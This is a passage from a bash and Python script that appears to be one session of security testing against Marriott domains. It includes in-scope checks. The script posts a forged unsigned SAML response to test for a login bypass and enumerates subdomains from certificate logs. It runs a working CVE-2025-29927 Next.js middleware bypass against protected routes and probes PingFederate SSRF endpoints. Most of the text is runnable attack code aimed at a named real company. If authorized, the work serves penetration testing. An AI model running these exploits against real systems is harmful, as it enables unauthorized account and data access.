    echo ""
    echo "--- D3: POST minimal malformed SAMLResponse (base64 of bare XML) ---"
    # Bare <?xml?><samlp:Response ...> with no Assertion — SP must reject
    # If SP redirects to app interior, that's an auth bypass
    MINIMAL_SAML_B64="PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIHhtbG5zOnNhbWw9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIElEPSJfdGVzdDEyMyIgVmVyc2lvbj0iMi4wIiBJc3N1ZUluc3RhbnQ9IjIwMjYtMDYtMjJUMDA6MDA6MDBaIj4KICA8c2FtbHA6U3RhdHVzPjxzYW1scDpTdGF0dXNDb2RlIFZhbHVlPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6c3RhdHVzOlN1Y2Nlc3MiLz48L3NhbWxwOlN0YXR1cz4KPC9zYW1scDpSZXNwb25zZT4="
    curl -sv --max-time 15 \
      -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
      -X POST \
      --data-urlencode "SAMLResponse=$MINIMAL_SAML_B64" \
      --data "RelayState=" \
      "$ACS_URL" \
      -o "$OUTDIR/acs-minimal-post.html" 2>&1 | grep -E "^[<>] |HTTP/|location:" | head -20 || true
    echo "D3: Minimal SAMLResponse POST body (first 500 chars):"
    head -c 500 "$OUTDIR/acs-minimal-post.html" 2>/dev/null || true

    echo ""
    echo "--- D4: Analyze responses for auth bypass indicators ---"
    python3 - <<PYEOF
import os, re

def analyze(label, fname):
    try:
        body = open(fname).read()
    except:
        print(f"{label}: File not found")
        return

    size = len(body)
    print(f"\n{label} ({size} bytes):")

    # Signs of successful auth bypass (bad outcomes)
    bypass_signals = [
        (r'Set-Cookie.*session', "SESSION COOKIE SET — possible auth bypass!"),
        (r'(?:dashboard|welcome|home|portal|inbox|profile)', "APP INTERIOR CONTENT — possible auth bypass!"),
        (r'Location:.*(?:dashboard|home|portal|app|welcome)', "REDIRECT TO APP — possible auth bypass!"),
    ]
    # Signs of correct rejection (good)
    reject_signals = [
        (r'(?:invalid|error|rejected|failed|denied|forbidden)', "SAML error/rejection (expected)"),
        (r'(?:signature|validation|certificate)', "Signature validation error (expected)"),
        (r'400|401|403|500', "Error HTTP code (expected)"),
    ]

    found_bypass = False
    for pattern, msg in bypass_signals:
        if re.search(pattern, body, re.IGNORECASE):
            print(f"  !!! {msg}")
            found_bypass = True

    if not found_bypass:
        for pattern, msg in reject_signals:
            if re.search(pattern, body, re.IGNORECASE):
                print(f"  OK: {msg}")
                break
        else:
            print(f"  AMBIGUOUS: No clear bypass or rejection signals")

analyze("D2 (empty SAMLResponse POST)", "$OUTDIR/acs-empty-post.html")
analyze("D3 (minimal SAMLResponse POST)", "$OUTDIR/acs-minimal-post.html")
PYEOF
  fi
fi

sleep 2

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "================================================================"
echo "PHASE E — CT enum retry via alternative sources"
echo "================================================================"
# crt.sh has been returning 502 for 2 sessions. Try Certspotter and wayback CDX.

WILDCARDS="apigwc.marriott.com apigatewayc.marriott.com marriott.com"

echo "--- E1: Certspotter API ---"
for domain in apigwc.marriott.com apigatewayc.marriott.com marriott.com; do
  echo "E1: Querying Certspotter for *.$domain ..."
  curl -s --max-time 30 \
    "https://api.certspotter.com/v1/issuances?domain=${domain}&include_subdomains=true&expand=dns_names" \
    -o "$OUTDIR/certspotter-${domain}.json" 2>/dev/null || echo "E1: curl failed for $domain"

  if [ -f "$OUTDIR/certspotter-${domain}.json" ]; then
    size=$(wc -c < "$OUTDIR/certspotter-${domain}.json")
    echo "E1: $domain => ${size} bytes"
    if [ "$size" -gt 10 ]; then
      python3 - <<PYEOF 2>/dev/null || true
import json, re
try:
    data = json.load(open("$OUTDIR/certspotter-${domain}.json"))
    if isinstance(data, list):
        hosts = set()
        for cert in data:
            for name in cert.get("dns_names", []):
                name = name.lower().lstrip("*.")
                if "marriott.com" in name or "apigwc" in name or "apigatewayc" in name:
                    hosts.add(name)
        print(f"  Unique hosts: {len(hosts)}")
        for h in sorted(hosts)[:40]:
            print(f"    {h}")
    elif isinstance(data, dict) and "message" in data:
        print(f"  API message: {data['message']}")
    else:
        print(f"  Unexpected response type: {type(data)}")
except json.JSONDecodeError as e:
    raw = open("$OUTDIR/certspotter-${domain}.json").read()
    print(f"  Not JSON ({len(raw)}B): {raw[:200]}")
PYEOF
    fi
  fi
  sleep 3
done

echo ""
echo "--- E2: Wayback CDX API for subdomain discovery ---"
for wildcard in "*.apigwc.marriott.com" "*.apigatewayc.marriott.com" "*.uat.marriott.com"; do
  domain=$(echo "$wildcard" | sed 's/^\*\.//')
  echo "E2: Querying wayback CDX for $wildcard ..."
  curl -s --max-time 30 \
    "https://web.archive.org/cdx/search/cdx?url=${wildcard}&output=json&fl=original&collapse=urlkey&limit=500" \
    -o "$OUTDIR/wayback-${domain}.json" 2>/dev/null || echo "E2: curl failed for $wildcard"

  if [ -f "$OUTDIR/wayback-${domain}.json" ]; then
    size=$(wc -c < "$OUTDIR/wayback-${domain}.json")
    echo "E2: $wildcard => ${size} bytes"
    if [ "$size" -gt 10 ]; then
      python3 - <<PYEOF 2>/dev/null || true
import json, re
from urllib.parse import urlparse
try:
    data = json.load(open("$OUTDIR/wayback-${domain}.json"))
    if isinstance(data, list):
        hosts = set()
        for entry in data[1:]:  # skip header row
            if entry and entry[0]:
                h = urlparse(entry[0]).netloc.lower()
                if h:
                    hosts.add(h)
        print(f"  Unique hosts from wayback: {len(hosts)}")
        for h in sorted(hosts)[:40]:
            print(f"    {h}")
    else:
        raw = open("$OUTDIR/wayback-${domain}.json").read()
        print(f"  Unexpected format: {raw[:200]}")
except Exception as e:
    raw = open("$OUTDIR/wayback-${domain}.json").read()
    print(f"  Error {e}: {raw[:200]}")
PYEOF
    fi
  fi
  sleep 3
done

echo ""
echo "--- E3: crt.sh retry (may be back up) ---"
for wildcard in "%.apigwc.marriott.com" "%.apigatewayc.marriott.com" "%.uat.marriott.com" "%.artifactory.marriott.com"; do
  echo "E3: crt.sh query for $wildcard ..."
  resp=$(curl -s -o "$OUTDIR/crtsh-$(echo $wildcard | tr '%./' '_').json" \
    -w "%{http_code}" \
    --max-time 20 \
    "https://crt.sh/?q=${wildcard}&output=json" 2>/dev/null || echo "000")
  echo "E3: $wildcard => HTTP $resp"
  if [ "$resp" = "200" ]; then
    size=$(wc -c < "$OUTDIR/crtsh-$(echo $wildcard | tr '%./' '_').json" 2>/dev/null || echo 0)
    echo "E3: Response size: ${size} bytes"
    if [ "$size" -gt 50 ]; then
      python3 - <<PYEOF 2>/dev/null || true
import json, re
fname = "$OUTDIR/crtsh-$(echo $wildcard | tr '%./' '_').json"
try:
    data = json.load(open(fname))
    hosts = set()
    for cert in data:
        for name in cert.get("name_value", "").split("\n"):
            name = name.strip().lstrip("*.")
            if name and "marriott.com" in name:
                hosts.add(name.lower())
    print(f"  Unique hosts: {len(hosts)}")
    for h in sorted(hosts)[:40]:
        print(f"    {h}")
except Exception as e:
    print(f"  Error: {e}")
PYEOF
    fi
  fi
  sleep 3
done

echo ""
echo "--- E4: Probe any newly discovered hosts ---"
echo "E4: (Run scope-check.sh + curl probe on any hosts found in E1-E3)"
# This is a placeholder — if E1-E3 find new hosts, add them here based on output
# The pattern: scope-check → curl -sI → check for 200/interesting responses

python3 - <<'PYEOF' 2>&1
import os, json, re, subprocess
from urllib.parse import urlparse

outdir = "/tmp/s18"
found_hosts = set()

# Collect hosts from all CT/wayback output files
for fname in os.listdir(outdir):
    if fname.endswith(".json") and (fname.startswith("certspotter") or fname.startswith("wayback") or fname.startswith("crtsh")):
        fpath = os.path.join(outdir, fname)
        try:
            content = open(fpath).read()
            if not content.strip():
                continue
            # Extract anything that looks like a marriott.com hostname
            hosts = re.findall(r'[a-z0-9-]+(?:\.[a-z0-9-]+)*\.marriott\.com', content.lower())
            for h in hosts:
                if h not in ("marriott.com",) and len(h) > 15:
                    found_hosts.add(h)
        except:
            pass

print(f"Total unique hosts found across all CT sources: {len(found_hosts)}")
for h in sorted(found_hosts)[:60]:
    print(f"  {h}")

PYEOF

sleep 2

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "================================================================"
echo "PHASE F — Decision Gate"
echo "================================================================"

echo "F1: Summarizing session 18 findings..."

python3 - <<'PYEOF' 2>&1
import os, json, re

outdir = "/tmp/s18"
print("=== SESSION 18 DECISION GATE ===\n")

# A: SAMLRequest decode
decoded = os.path.join(outdir, "samlrequest-decoded.xml")
if os.path.exists(decoded):
    xml = open(decoded).read()
    if "AuthnRequest" in xml or "saml" in xml.lower():
        acs = re.search(r'AssertionConsumerServiceURL=["\']([^"\']+)["\']', xml)
        issuer = re.search(r'<[^>]*Issuer[^>]*>([^<]+)<', xml)
        dest = re.search(r'Destination=["\']([^"\']+)["\']', xml)
        signed = "SIGNED" if ("<ds:Signature" in xml or "<Signature" in xml) else "UNSIGNED"
        print(f"A (SAMLRequest): DECODED {signed}")
        if acs: print(f"   ACS URL: {acs.group(1)}")
        if issuer: print(f"   Issuer: {issuer.group(1).strip()}")
        if dest: print(f"   Destination: {dest.group(1)}")
    else:
        print("A (SAMLRequest): DECODED but not SAML XML — check manually")
else:
    print("A (SAMLRequest): NOT DECODED — file missing")

# B: graphql-chunk
gql_mine = os.path.join(outdir, "graphql-mining.txt")
if os.path.exists(gql_mine):
    content = open(gql_mine).read()
    ops = re.findall(r'=== GraphQL Operations \((\d+)\)', content)
    endpoints = re.findall(r'=== Potential Endpoints \((\d+)\)', content)
    cids = re.findall(r'=== Client/App IDs \((\d+)\)', content)
    print(f"\nB (graphql-chunk): MINED")
    if ops: print(f"   Operations: {ops[0]}")
    if endpoints: print(f"   Endpoints: {endpoints[0]}")
    if cids: print(f"   Client IDs: {cids[0]}")
    # Check for high-value finds
    if "mutation" in content.lower():
        print("   !!! MUTATIONS FOUND — potential write operations without auth check")
    if any(x in content for x in ["getUser", "listUser", "currentUser", "profile"]):
        print("   !!! User/profile operations found — test without auth")
else:
    print("\nB (graphql-chunk): NOT MINED — file missing")

# C: OIDC/API probes
print("\nC (auth-apc API probe): See raw output above for 200/non-standard responses")

# D: ACS bypass test
for label, fname in [("empty POST", "acs-empty-post.html"), ("minimal POST", "acs-minimal-post.html")]:
    fpath = os.path.join(outdir, fname)
    if os.path.exists(fpath):
        body = open(fpath).read()
        if any(x in body.lower() for x in ["session", "dashboard", "welcome", "portal"]):
            print(f"\nD (ACS {label}): !!! POTENTIAL BYPASS — APP CONTENT IN RESPONSE")
        else:
            print(f"\nD (ACS {label}): REJECTED (expected) — no bypass indicators")
    else:
        print(f"\nD (ACS {label}): NOT RUN")

# E: CT enum
ct_hosts = set()
for fname in os.listdir(outdir):
    if fname.endswith(".json"):
        try:
            content = open(os.path.join(outdir, fname)).read()
            hosts = re.findall(r'[a-z0-9-]+(?:\.[a-z0-9-]+)*\.marriott\.com', content.lower())
            ct_hosts.update(h for h in hosts if len(h) > 20 and h != "marriott.com")
        except:
            pass
print(f"\nE (CT enum): {len(ct_hosts)} unique hosts discovered")

print("\n=== NEXT ACTIONS ===")
print("1. If ACS URL is on efast.marriott.com (in-scope): escalate D tests")
print("2. If graphql-chunk has operations: test them unauthenticated from auth-apc")
print("3. If OIDC config found: test redirect_uri bypass with evil.example.com")
print("4. If new CT hosts found: scope-check all → probe any that are IN-SCOPE")
print("5. If no new surface: pivot to Saviynt (M006) or franchise gateway cluster")

PYEOF

sleep 2

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "================================================================"
echo "PHASE G — CVE probe: CVE-2025-29927 (Next.js) + CVE-2023-40148 (PingFederate)"
echo "================================================================"
# CVE-2025-29927: Next.js middleware auth bypass (CVSS 9.1)
# Bypass: send any protected route with x-middleware-subrequest header
# Value = path of middleware.ts relative to project root (no .ts extension)
# Common values: "middleware", "src/middleware", "pages/middleware"
# For Next.js v15+: repeat 5 times with colons: "middleware:middleware:..."
# Impact: if protected routes are only guarded by middleware, full auth bypass
#
# CVE-2023-40148: PingFederate unauthenticated SSRF via forged HTTP POST
# Affected: PingFederate >= 11.0.0 (Marriott likely runs this range)
# Endpoint: likely /ext/ref/authenticate or adapter callback URLs
# OAST canary: use burp collaborator or interactsh — but we use benign probe only

scope_check "auth-apc.marriott.com" || { echo "SKIP Phase G"; }

MW_HEADER_VALUES=("middleware" "src/middleware" "pages/middleware" "app/middleware")

# Determine middleware path from Phase C3c if available
if [ -f "$OUTDIR/middlewareManifest.js" ] && [ "$(wc -c < $OUTDIR/middlewareManifest.js)" -gt 10 ]; then
  DETECTED_MW=$(python3 -c "
import re
js = open('$OUTDIR/middlewareManifest.js').read()
paths = re.findall(r'[\"\'']([a-z_/]+middleware[a-z_/]*)[\"\'']', js, re.IGNORECASE)
print(':'.join(sorted(set(p for p in paths if 'node_modules' not in p))[:3]))
" 2>/dev/null || echo "")
  if [ -n "$DETECTED_MW" ]; then
    echo "G0: Detected middleware path from manifest: $DETECTED_MW"
    MW_HEADER_VALUES=("$DETECTED_MW" "${MW_HEADER_VALUES[@]}")
  fi
fi

echo ""
echo "--- G1: CVE-2025-29927 — Baseline (no bypass header) ---"
# First establish what the normal response looks like for a protected route
# /login = public page. We need to find a protected route from buildManifest.js
PROTECTED_ROUTES=()
if [ -f "$OUTDIR/buildManifest.js" ]; then
  mapfile -t PROTECTED_ROUTES < <(python3 - <<PYEOF 2>/dev/null || true
import re, json
js = open("$OUTDIR/buildManifest.js").read()
m = re.search(r'"sortedPages"\s*:\s*(\[[^\]]+\])', js)
if m:
    pages = json.loads(m.group(1))
    # Prioritize non-login pages (likely protected)
    for p in pages:
        if p not in ('/', '/login', '/404', '/500', '/_error'):
            print(p)
PYEOF
)
fi

# Fall back to guessed protected routes if manifest not available
if [ ${#PROTECTED_ROUTES[@]} -eq 0 ]; then
  PROTECTED_ROUTES=("/account" "/dashboard" "/profile" "/home" "/settings" "/bookings" "/rewards" "/loyalty")
fi

echo "G1: Protected route candidates: ${PROTECTED_ROUTES[*]}"

# Test first 3 protected routes for baseline
for route in "${PROTECTED_ROUTES[@]:0:3}"; do
  resp=$(curl -sv -o "$OUTDIR/g1-baseline$(echo $route | tr '/' '_').html" \
    -w "%{http_code}|%{size_download}|%{redirect_url}" --max-time 15 \
    -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
    "${BASE_URL_APC}${route}" 2>/dev/null || echo "000|0|")
  code=$(echo "$resp" | cut -d'|' -f1)
  size=$(echo "$resp" | cut -d'|' -f2)
  redir=$(echo "$resp" | cut -d'|' -f3)
  echo "G1 baseline ${route}: ${code}/${size}B redir=${redir}"
  sleep 1
done

echo ""
echo "--- G2: CVE-2025-29927 — Bypass attempt with x-middleware-subrequest ---"
echo "G2: Testing middleware header values: ${MW_HEADER_VALUES[*]}"
for route in "${PROTECTED_ROUTES[@]:0:3}"; do
  for mw_val in "${MW_HEADER_VALUES[@]}"; do
    resp=$(curl -s -o "$OUTDIR/g2-bypass$(echo $route | tr '/' '_')-$(echo $mw_val | tr '/:' '__').html" \
      -w "%{http_code}|%{size_download}|%{redirect_url}" --max-time 15 \
      -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
      -H "x-middleware-subrequest: ${mw_val}" \
      "${BASE_URL_APC}${route}" 2>/dev/null || echo "000|0|")
    code=$(echo "$resp" | cut -d'|' -f1)
    size=$(echo "$resp" | cut -d'|' -f2)
    redir=$(echo "$resp" | cut -d'|' -f3)
    echo "G2 CVE-25-29927 [${mw_val}] ${route}: ${code}/${size}B redir=${redir}"
    sleep 1
  done

  # Also test the v15 variant (5x colon-separated)
  MW_V15="${MW_HEADER_VALUES[0]}:${MW_HEADER_VALUES[0]}:${MW_HEADER_VALUES[0]}:${MW_HEADER_VALUES[0]}:${MW_HEADER_VALUES[0]}"
  resp=$(curl -s -o /dev/null \
    -w "%{http_code}|%{size_download}|%{redirect_url}" --max-time 15 \
    -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
    -H "x-middleware-subrequest: ${MW_V15}" \
    "${BASE_URL_APC}${route}" 2>/dev/null || echo "000|0|")
  code=$(echo "$resp" | cut -d'|' -f1)
  size=$(echo "$resp" | cut -d'|' -f2)
  redir=$(echo "$resp" | cut -d'|' -f3)
  echo "G2 CVE-25-29927 [v15-5x] ${route}: ${code}/${size}B redir=${redir}"
  sleep 1
done

echo ""
echo "--- G3: CVE-2025-29927 — Analyze bypass results ---"
python3 - <<'PYEOF'
import os, re, glob

outdir = "/tmp/s18"
bypass_files = glob.glob(f"{outdir}/g2-bypass*.html")
baseline_files = glob.glob(f"{outdir}/g1-baseline*.html")

baselines = {}
for f in baseline_files:
    try:
        content = open(f).read()
        key = os.path.basename(f).replace("g1-baseline","").replace(".html","")
        baselines[key] = (len(content), content[:200])
    except:
        pass

print("=== CVE-2025-29927 Bypass Analysis ===\n")
for f in sorted(bypass_files):
    try:
        content = open(f).read()
        fname = os.path.basename(f)
        size = len(content)

        # Check for bypass indicators vs redirect-to-login
        login_redirect = bool(re.search(r'href=["\']/?login["\']|location:\s*/login|/login\?', content, re.IGNORECASE))
        has_app_content = bool(re.search(r'(?:dashboard|account|profile|booking|rewards|loyalty|member)', content, re.IGNORECASE))
        has_auth_error = bool(re.search(r'(?:unauthorized|forbidden|401|403|sign.in|log.in)', content, re.IGNORECASE))
        has_session = bool(re.search(r'Set-Cookie.*(?:session|auth|token)', content, re.IGNORECASE))

        status = "AMBIGUOUS"
        if login_redirect and not has_app_content:
            status = "BLOCKED (login redirect — not bypassed)"
        elif has_app_content and not login_redirect:
            status = "!!! POTENTIAL BYPASS — app content without login redirect !!!"
        elif has_auth_error:
            status = "BLOCKED (auth error)"
        elif size < 200:
            status = "BLOCKED (empty/tiny response)"

        print(f"  {fname}")
        print(f"    Size: {size}B | Status: {status}")
        if "BYPASS" in status:
            print(f"    Content preview: {content[:300]}")
        print()
    except Exception as e:
        print(f"  {f}: Error {e}")

PYEOF

echo ""
echo "--- G4: CVE-2023-40148 — PingFederate SSRF probe on auth-apc ---"
# PingFederate SSRF via forged HTTP POST to adapter/authentication endpoints
# Common PingFederate endpoints that can trigger SSRF:
#   /ext/ref/authenticate — external reference adapter (URL-based, can trigger outbound HTTP)
#   /idp/ping.oauth2 — OAuth2 ping endpoint
#   /as/authorization.oauth2 with crafted redirect_uri — may proxy internal resources
#   /pf/adapter/idp/ — IDP adapter endpoints
#
# SAFE PROBE: We probe if these paths exist (200/302) vs don't exist (404/000)
# We do NOT send arbitrary SSRF payloads — just check for endpoint existence
# If endpoints exist, note as potential SSRF surface for manual testing

echo "G4: Probing PingFederate runtime endpoints for CVE-2023-40148 surface..."
for path in \
  "/ext/ref/authenticate" \
  "/ext/ref/openid/authenticate" \
  "/pf/adapter/idp" \
  "/idp/ping.oauth2" \
  "/as/authorization.oauth2" \
  "/pf/heartbeat.ping" \
  "/pf/pingfederate-ws/users" \
  "/pf-ws/rest/v1/resources" \
  "/ext/ref/login" \
  "/sp/startSSO.ping" \
  "/idp/startSSO.ping"
do
  resp=$(curl -s -o /dev/null -w "%{http_code}|%{size_download}" --max-time 15 \
    -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
    "${BASE_URL_APC}${path}" 2>/dev/null || echo "000|0")
  code=$(echo "$resp" | cut -d'|' -f1)
  size=$(echo "$resp" | cut -d'|' -f2)
  echo "G4 ${path}: ${code}/${size}B"
  sleep 1
done

echo ""
echo "--- G5: CVE-2025-29927 — Determine Next.js version from chunk filenames ---"
# Next.js embeds its version in package.json inside the chunks.
# Also: known chunk hash patterns differ between major versions.
# Try fetching package.json from static assets
if [ -n "${BUILD_ID:-}" ]; then
  for path in \
    "/_next/static/chunks/framework-${BUILD_ID}.js" \
    "/_next/static/${BUILD_ID}/_ssgManifest.js" \
    "/_next/static/${BUILD_ID}/_middlewareManifest.js"
  do
    resp=$(curl -s -o /dev/null -w "%{http_code}|%{size_download}" --max-time 15 \
      -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
      "${BASE_URL_APC}${path}" 2>/dev/null || echo "000|0")
    code=$(echo "$resp" | cut -d'|' -f1)
    size=$(echo "$resp" | cut -d'|' -f2)
    echo "G5 ${path}: ${code}/${size}B"
    sleep 1
  done
fi

# Also check framework chunk (contains React/Next version)
FRAMEWORK_CHUNK=$(ls "$APC_CHUNKS_DIR"/framework-*.js 2>/dev/null | head -1 || echo "")
if [ -n "$FRAMEWORK_CHUNK" ]; then
  echo "G5: Framework chunk found at $FRAMEWORK_CHUNK, extracting Next.js version..."
  python3 - <<PYEOF 2>/dev/null || true
import re
try:
    js = open("$FRAMEWORK_CHUNK").read()
    # next version string patterns
    m = re.search(r'\"next\"\s*:\s*\"([^\"]+)\"', js)
    if m:
        print(f"  Next.js version: {m.group(1)}")
    m2 = re.search(r'next[_/]([0-9]+\.[0-9]+\.[0-9]+)', js)
    if m2:
        print(f"  Next.js version (alt): {m2.group(1)}")
    m3 = re.search(r'react@([0-9]+\.[0-9]+\.[0-9]+)', js)
    if m3:
        print(f"  React version: {m3.group(1)}")
except:
    pass
PYEOF
else
  echo "G5: Framework chunk not in cache. Try: grep framework $OUTDIR/apc-login.html | head -5"
  if [ -f "$OUTDIR/apc-login.html" ]; then
    grep -oP '_next/static/chunks/[^"]+framework[^"]+\.js' "$OUTDIR/apc-login.html" | head -3 || true
  fi
fi

echo ""
echo "--- G6: CVE-2025-29927 summary and verdict ---"
python3 - <<'PYEOF'
import os, re, glob

outdir = "/tmp/s18"
print("=== CVE-2025-29927 VERDICT ===")

# Count bypass vs blocked results
bypass_files = glob.glob(f"{outdir}/g2-bypass*.html")
bypassed = []
blocked = []
for f in bypass_files:
    try:
        content = open(f).read()
        has_redirect = bool(re.search(r'href=["\']/?login["\']|/login\?', content, re.IGNORECASE))
        has_content = bool(re.search(r'(?:dashboard|account|profile|booking|rewards|loyalty|member)', content, re.IGNORECASE))
        if has_content and not has_redirect:
            bypassed.append(os.path.basename(f))
        else:
            blocked.append(os.path.basename(f))
    except:
        pass

if bypassed:
    print(f"\n!!! CRITICAL FINDING — CVE-2025-29927 CONFIRMED VULNERABLE !!!")
    print(f"  {len(bypassed)} routes bypassed: {bypassed}")
    print(f"  Report as: Next.js Middleware Auth Bypass (CVE-2025-29927)")
    print(f"  Severity: Critical (CVSS 9.1)")
    print(f"  Impact: All middleware-protected routes accessible without authentication")
elif blocked:
    print(f"\n  MITIGATED — all {len(blocked)} tested routes returned auth redirect with bypass header")
    print(f"  Either patched (14.2.25+/15.2.3+) or auth not solely in middleware")
else:
    print(f"\n  No bypass files generated — protected routes not found or Phase G not run")
    print(f"  Action: manually test known protected routes with x-middleware-subrequest header")

PYEOF

echo ""
echo "================================================================"
echo "SESSION 18 COMPLETE"
echo "Logs saved to: $OUTDIR/"
echo "Key files:"
echo "  $OUTDIR/samlrequest-decoded.xml    -- efast SAMLRequest XML"
echo "  $OUTDIR/graphql-mining.txt         -- graphql-chunk analysis"
echo "  $OUTDIR/nodeforge-mining.txt       -- nodeForge crypto analysis"
echo "  $OUTDIR/apc-login.html             -- auth-apc login page HTML"
echo "  $OUTDIR/acs-empty-post.html        -- ACS empty SAML POST response"
echo "  $OUTDIR/acs-minimal-post.html      -- ACS minimal SAML POST response"
echo "  $OUTDIR/certspotter-*.json         -- Certspotter CT results"
echo "  $OUTDIR/wayback-*.json             -- Wayback CDX subdomain results"
echo "================================================================"
